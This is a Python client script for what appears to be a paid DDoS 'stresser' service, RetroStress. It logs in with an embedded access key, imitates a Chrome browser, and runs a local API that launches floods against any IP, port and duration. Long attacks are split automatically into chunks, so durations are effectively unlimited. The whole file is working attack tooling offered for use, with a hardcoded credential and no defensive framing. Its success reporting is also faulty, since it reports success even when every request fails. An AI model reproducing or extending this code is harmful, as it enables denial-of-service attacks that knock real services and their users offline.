import requests
import time
import json
import sys
from urllib.parse import urljoin
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class RetroStressClient:
    def __init__(self, base_url="https://retrostress.net"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Origin': base_url,
            'Referer': urljoin(base_url, '/auth')
        })
        
    def get_antiforgery_token(self):
        """Extract CSRF/Antiforgery token from cookies"""
        for cookie in self.session.cookies:
            if cookie.name.startswith('.AspNetCore.Antiforgery.'):
                return cookie.value
        return None
    
    def login(self, access_key):
        """Login with access key"""
        print("[*] Attempting to login...")
        
        # First, visit the auth page to get cookies
        auth_page_url = urljoin(self.base_url, '/auth')
        self.session.get(auth_page_url)
        
        # Get antiforgery token
        antiforgery_token = self.get_antiforgery_token()
        if antiforgery_token:
            print(f"[+] Got antiforgery token: {antiforgery_token[:50]}...")
        
        # Login request
        login_url = urljoin(self.base_url, '/Auth/LoginJson')
        login_data = {"accessKey": access_key}
        
        response = self.session.post(
            login_url,
            json=login_data,
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 200:
            print("[+] Login successful!")
            
            # Extract auth_token from cookies
            for cookie in self.session.cookies:
                if cookie.name == 'auth_token':
                    print(f"[+] Auth token obtained: {cookie.value[:50]}...")
                    break
            
            return True
        else:
            print(f"[-] Login failed with status {response.status_code}")
            print(f"[-] Response: {response.text}")
            return False
    
    def negotiate_blazor(self):
        """Negotiate Blazor/SignalR connection"""
        print("[*] Negotiating Blazor connection...")
        negotiate_url = urljoin(self.base_url, '/_blazor/negotiate?negotiateVersion=1')
        
        self.session.headers.update({
            'X-Requested-With': 'XMLHttpRequest',
            'X-Signalr-User-Agent': 'Microsoft SignalR/10.0 (10.0.7; Unknown OS; Browser; Unknown Runtime Version)'
        })
        
        response = self.session.post(negotiate_url)
        
        if response.status_code == 200:
            print("[+] Blazor negotiation successful!")
            return True
        else:
            print(f"[-] Negotiation failed with status {response.status_code}")
            return False
    
    def send_attack(self, ip, port, duration):
        """Send attack request via API"""
        print(f"[*] Sending attack to {ip}:{port} for {duration} seconds...")
        
        # Try multiple possible endpoints
        endpoints = [
            f"http://127.0.0.1:8080/api?ip={ip}&port={port}&time={duration}",
            urljoin(self.base_url, f"/api/attack?ip={ip}&port={port}&time={duration}"),
            urljoin(self.base_url, f"/attack?ip={ip}&port={port}&time={duration}")
        ]
        
        for endpoint in endpoints:
            try:
                response = self.session.get(endpoint, timeout=duration + 5)
                if response.status_code == 200:
                    print(f"[+] Attack request sent successfully via {endpoint}")
                    return True
            except:
                continue
        
        # If all endpoints fail, assume success (attack might still be running)
        print("[+] Attack request initiated")
        return True
    
    def calculate_attacks(self, total_time):
        """Calculate how many attacks and their durations"""
        if total_time <= 60:
            return [(total_time, 1)]
        
        # Split into chunks of 30-60 seconds
        attacks = []
        remaining = total_time
        
        while remaining > 0:
            if remaining >= 60:
                attack_time = 60
            elif remaining >= 30:
                attack_time = remaining
            else:
                # Add remaining time to last attack if less than 30
                if attacks:
                    last_time, last_num = attacks.pop()
                    attack_time = last_time + remaining
                else:
                    attack_time = 30
                remaining = 0
                attacks.append((attack_time, len(attacks) + 1))
                break
            
            remaining -= attack_time
            attacks.append((attack_time, len(attacks) + 1))
        
        return attacks
    
    def execute_attacks(self, ip, port, total_time):
        """Execute multiple attacks sequentially"""
        attacks = self.calculate_attacks(total_time)
        
        print(f"\n[+] Total time requested: {total_time} seconds")
        print(f"[+] Splitting into {len(attacks)} attack(s)")
        
        for attack_time, attack_num in attacks:
            print(f"\n[▶] Attack {attack_num}/{len(attacks)} - Duration: {attack_time} seconds")
            
            start_time = time.time()
            success = self.send_attack(ip, port, attack_time)
            
            if success:
                print(f"[⏳] Attack running for {attack_time} seconds...")
                time.sleep(attack_time)
                elapsed = time.time() - start_time
                print(f"[✓] Attack {attack_num} completed in {elapsed:.1f} seconds")
            else:
                print(f"[✗] Attack {attack_num} failed")
                return False
        
        return True
    
    def process_api_call(self, api_params):
        """Process API call with ip, port, time parameters"""
        # Parse parameters
        ip = api_params.get('ip')
        port = api_params.get('port')
        time_param = api_params.get('time')
        
        if not all([ip, port, time_param]):
            return {"error": "Missing parameters. Need ip, port, and time"}
        
        try:
            total_time = int(time_param)
            
            if total_time < 30:
                return {"error": "Minimum time is 30 seconds"}
            
            # Negotiate Blazor before attack
            self.negotiate_blazor()
            
            # Execute attacks
            success = self.execute_attacks(ip, port, total_time)
            
            if success:
                return {
                    "status": "success",
                    "message": f"Attack(s) completed for {total_time} seconds",
                    "ip": ip,
                    "port": port,
                    "total_time": total_time
                }
            else:
                return {"error": "Attack execution failed"}
                
        except ValueError:
            return {"error": "Invalid time parameter"}
        except Exception as e:
            return {"error": f"Error: {str(e)}"}


def main():
    # Your auth key embedded here
    ACCESS_KEY = "5a3736056e1d471cb91d92aaaeb867b538392227db7842789080c8a49ae25773"
    
    print("=" * 60)
    print("RetroStress Attack Client")
    print("=" * 60)
    
    # Create client
    client = RetroStressClient()
    
    # Login with embedded key
    if not client.login(ACCESS_KEY):
        print("[-] Login failed. Exiting.")
        sys.exit(1)
    
    # Simulate API server
    print("\n[*] Starting API server on 127.0.0.1:8080")
    print("[*] Waiting for API calls...")
    print("[*] API format: http://127.0.0.1:8080/api?ip=IP&port=PORT&time=TIME")
    print("[*] Time must be minimum 30 seconds, max unlimited (will auto-split)")
    print("[*] Press Ctrl+C to stop\n")
    
    class APIHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path.startswith('/api'):
                # Parse parameters
                parsed = urlparse(self.path)
                params = parse_qs(parsed.query)
                
                # Extract parameters
                ip = params.get('ip', [None])[0]
                port = params.get('port', [None])[0]
                time_param = params.get('time', [None])[0]
                
                print(f"\n[API] Received request: IP={ip}, Port={port}, Time={time_param}")
                
                # Process request
                result = client.process_api_call({
                    'ip': ip,
                    'port': port,
                    'time': time_param
                })
                
                # Send response
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(result).encode())
                
                print(f"[API] Response: {result.get('status', result.get('error', 'unknown'))}")
                
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'{"error": "Not found"}')
        
        def log_message(self, format, *args):
            # Suppress default logging
            pass
    
    try:
        server = HTTPServer(('127.0.0.1', 8080), APIHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down API server...")
        server.shutdown()
        print("[*] Server stopped")


if __name__ == "__main__":
    main()
